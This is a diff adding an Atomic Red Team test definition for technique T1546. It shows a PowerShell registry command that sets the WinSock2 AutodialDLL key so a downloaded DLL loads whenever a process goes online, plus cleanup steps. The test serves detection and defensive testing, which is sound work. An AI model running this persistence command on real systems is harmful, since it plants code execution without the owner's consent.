@@ -1,0 +1,27 @@
+attack_technique: T1546
+display_name: Event Triggered Execution
+atomic_tests:
+
+- name: Persistence with Custom AutodialDLL
+  description: |
+    The DLL pointed to by the AutodialDLL registry key is loaded every time a process connects to the internet. Attackers can gain persistent code execution by setting this key to a DLL of their choice. 
+    
+    The sample dll provided, AltWinSock2DLL, will launch the notepad process. Starting and stopping a web browser such as MS Edge or Chrome should result in the dll executing.
+    [Blog](https://www.mdsec.co.uk/2022/10/autodialdlling-your-way/)
+  supported_platforms:
+  - windows
+  dependencies:
+  - description: |
+      AltWinSock2DLL DLL must exist on disk at specified at PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll
+    prereq_command: |
+      if (Test-Path "#{helper_file}") { exit 0} else { exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory "PathToAtomicsFolder\T1546\bin\" -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546/bin/AltWinSock2DLL.dll" -OutFile "PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll"
+  executor:
+    command: |
+      Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll
+    cleanup_command:
+      Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value  $env:windir\system32\rasadhlp.dll
+    name: powershell
+    elevation_required: true
